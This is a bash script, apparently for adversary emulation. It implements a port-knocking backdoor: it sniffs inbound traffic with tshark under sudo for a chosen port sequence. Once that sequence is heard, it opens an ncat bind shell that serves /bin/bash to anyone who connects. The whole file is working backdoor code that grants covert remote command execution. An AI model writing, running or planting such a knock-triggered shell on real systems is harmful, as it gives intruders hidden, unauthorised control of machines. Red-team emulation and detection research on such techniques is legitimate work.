#!/bin/bash

### Constants
#################################################
readonly PRINT_DEBUG=1  # Set to 0 for debug messages

### Functions
#################################################
function debug () {
  if [[ "${PRINT_DEBUG}" -eq 0 ]]; then
    echo $1 >&2
  fi
}

function someone_knocked() {
  local knock_protocol="$1"
  local knock_port_sequence="$2"
  local max_listen_seconds="$3"
  local tshark_filter=""
  local grep_pattern=""
  local -i counter=0

  if [ "$knock_protocol" = "tcp" ] ; then
    local tshark_protocl="tcp"
  else
    local tshark_protocl="udp"
  fi

  # Build tshark filter
  for knock_port in $(echo "${knock_port_sequence}" | tr "," "\n" | sort | uniq | tr "\n" " "); do
    if [ -z "${tshark_filter}" ] ; then
      tshark_filter="(${tshark_protocl} dst port ${knock_port})"
    else
      tshark_filter="${tshark_filter} or (${tshark_protocl} dst port ${knock_port})"
    fi
  done
  tshark_filter="(${tshark_filter}) and inbound"
  debug "TSHARK_FILTER: ${tshark_filter}"

  # Build grep of tshark output
  for knock_port in $(echo "${knock_port_sequence}" | tr "," " "); do
    if [ -z "${grep_pattern}" ] ; then
      grep_pattern="'${knock_port}'"
    else
      grep_pattern="${grep_pattern}(.*\n)*'${knock_port}'"
    fi
  done
  debug "GREP_PATTERN: ${grep_pattern}"

  debug "Listen for sequence for ${max_listen_seconds} seconds"
  sudo tshark -Q -l -n -T fields -E quote=s -e ${tshark_protocl}.dstport -a duration:${max_listen_seconds} "${tshark_filter}" > /tmp/t1205_server.dat  2> /dev/null &

  while [[ ${counter} -lt ${max_listen_seconds} ]]; do
    grep -qPoz  "${grep_pattern}" /tmp/t1205_server.dat 2>&1 /dev/null
    if [ $? -eq 0 ]; then
      debug "Sequence found!!!"
      sudo pkill tshark
      sleep 1s
      echo 0
      return 0
    fi
    debug "We have been listening for ${counter} seconds out of max ${max_listen_seconds} seconds"
    (( counter += 1 ))
    sleep 1s
  done
  echo 1
  return 1
}

function open_bind_server () {
  local max_listen_seconds=$1
  local listening_port=$2
  timeout ${max_listen_seconds}s ncat -nlp ${listening_port} -e /bin/bash
}

### Main
#################################################
function main () {
  # Arguments
  readonly KNOCK_PROTOCOL="$1"
  readonly KNOCK_PORT_SEQUENCE="$2"
  readonly SERVER_LISTENING_PORT="$3"
  readonly MAX_LISTEN_SECONDS="$4"

  if [[ $(someone_knocked $KNOCK_PROTOCOL $KNOCK_PORT_SEQUENCE $MAX_LISTEN_SECONDS) -eq 0 ]]; then
    debug "Start shell server; listen for up to ${MAX_LISTEN_SECONDS} seconds."
    open_bind_server "${MAX_LISTEN_SECONDS}" "${SERVER_LISTENING_PORT}"
    exit 0
  else
    debug "Knock sequence never heard..."
    exit 1
  fi
}

main "$@"